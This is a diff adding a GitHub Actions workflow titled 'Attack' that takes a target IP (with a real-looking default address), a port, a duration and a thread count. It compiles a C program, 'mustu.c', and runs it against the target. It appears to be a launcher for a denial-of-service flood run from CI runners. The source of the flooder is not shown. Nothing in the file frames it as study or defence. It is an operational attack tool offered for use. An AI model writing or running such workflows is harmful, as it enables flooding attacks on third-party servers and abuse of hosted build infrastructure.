@@ -1,0 +1,40 @@
+name: Attack
+
+on:
+  workflow_dispatch:
+    inputs:
+      ip:
+        description: 'Target IP'
+        required: true
+        default: '91.108.17.10'
+      port:
+        description: '32001'
+        required: true
+        default: '80'
+      time:
+        description: 'Duration (seconds)'
+        required: true
+        default: '120'
+      threads:
+        description: 'Number of Threads'
+        required: true
+        default: '100'
+
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    
+    steps:
+    - name: Checkout
+      uses: actions/checkout@v4
+      
+    - name: Compile
+      run: gcc -o mustu mustu.c -lpthread
+      
+    - name: Run Attack
+      run: |
+        echo "Starting attack on ${{ github.event.inputs.ip }}:${{ github.event.inputs.port }}"
+        echo "Duration: ${{ github.event.inputs.time }} seconds"
+        echo "Threads: ${{ github.event.inputs.threads }}"
+        echo ""
+        ./mustu ${{ github.event.inputs.ip }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }} ${{ github.event.inputs.threads }}
